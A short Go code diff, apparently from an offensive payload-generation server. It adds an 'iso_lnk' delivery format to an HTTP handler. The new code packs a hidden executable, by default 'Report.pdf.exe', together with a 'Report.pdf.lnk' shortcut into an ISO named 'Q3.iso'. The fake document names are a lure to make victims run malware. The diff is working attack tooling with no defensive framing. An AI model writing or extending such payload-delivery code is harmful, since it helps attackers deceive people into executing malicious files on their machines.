@@ -74,8 +74,22 @@ func (s *Server) handleGenerateDelivery(c *gin.Context) {
 		out, buildErr = payload.BuildISO9660(filename, raw)
 		outName = "drop.iso"
 		mime = "application/x-iso9660-image"
+	case "iso_lnk", "iso-lnk", "isolnk":
+		raw, err := decodeOptionalB64(req.DataB64)
+		if err != nil {
+			respondError(c, http.StatusBadRequest, "invalid data_b64")
+			return
+		}
+		if filename == "" {
+			filename = "Report.pdf.exe"
+		}
+		lnkName := "Report.pdf.lnk"
+		// filename is the hidden exe name
+		out, buildErr = payload.BuildISOWithLNK(lnkName, filename, raw)
+		outName = "Q3.iso"
+		mime = "application/x-iso9660-image"
 	default:
-		respondError(c, http.StatusBadRequest, "format must be html, url, lnk, or iso")
+		respondError(c, http.StatusBadRequest, "format must be html, url, lnk, iso, or iso_lnk")
 		return
 	}
 	if buildErr != nil {
